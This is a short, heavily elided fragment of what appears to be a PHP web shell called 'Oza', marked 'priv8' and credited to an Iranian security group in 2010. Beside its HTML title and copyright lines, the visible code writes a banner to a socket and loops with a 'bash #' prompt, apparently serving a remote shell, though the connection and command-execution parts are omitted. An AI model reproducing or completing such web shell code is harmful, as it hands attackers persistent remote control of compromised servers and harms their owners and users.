...
<title>Oza - Vrsion : 1.0.0 - priv8 4 My friend </title>
<style>
<!--
...
&nbsp;Note : Oza&nbsp; Have copyright from simorgh security Group  <br>
...
echo "</font>";
		...
		//********************************************************
		 ...
		 fputs ($fp ,"\n*********************************************\nWelcome T0 Oza 1.00  ready 2 USe\n*********************************************\n\n");
	  while(!feof($fp)){ 
       fputs ($fp," bash # ");
...
exit(0);
		...
		<tr>
			...
			Copyright 2010-Simorgh Security<br>
			Hossein-Asgari<br>
